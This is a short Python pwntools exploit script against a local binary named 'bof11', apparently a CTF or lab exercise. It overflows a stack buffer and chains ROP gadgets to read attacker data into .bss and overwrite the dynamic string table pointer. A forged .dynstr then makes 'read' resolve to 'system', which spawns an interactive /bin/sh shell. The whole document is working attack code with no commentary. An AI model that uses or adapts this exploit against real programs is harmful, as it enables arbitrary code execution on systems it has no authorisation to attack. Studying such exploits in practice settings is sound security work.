#!/bin/python3
from pwn import *
# context.log_level = 'debug'

elf = ELF('./bof11')
offset = 0x70+8
read_plt = elf.plt['read']

stack_size = 0x100
bss_addr = 0x600B30
base_stage = bss_addr + stack_size

pop_rdi_ret = 0x400773
pop_rsi_r15_ret = 0x400771

strtab_addr = 0x600988
write_plt_1 = 0x4004E6

p = process('./bof11')
p.recvuntil('\n')
pause()
payload  = b'a'*offset
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_r15_ret)
payload += p64(base_stage)
payload += p64(0)
payload += p64(read_plt)            # read(0, base_stage, 0x100)

# payload += p64(pop_rdi_ret)
# payload += p64(0)
payload += p64(pop_rsi_r15_ret)
payload += p64(strtab_addr)
payload += p64(0)
payload += p64(read_plt)            # read(0, strtab_addr, 0x100)

payload += p64(pop_rdi_ret)
payload += p64(base_stage)
payload += p64(pop_rsi_r15_ret)
payload += p64(0)
payload += p64(0)
payload += p64(write_plt_1)

p.sendline(payload)

fake_dynstr  = b'\x00libc.so.6\x00stdin\x00strlen\x00read'
fake_dynstr += b'\x00stdout\x00setbuf\x00__libc_start_main\x00'
fake_dynstr += b'system\x00'

payload2  = b'/bin/sh\x00'
payload2 += fake_dynstr

pause()
p.sendline(payload2)

fake_dynstr_addr = base_stage + 0x8

payload3  = p64(0x5)
payload3 += p64(fake_dynstr_addr)

pause()
p.sendline(payload3)

p.interactive()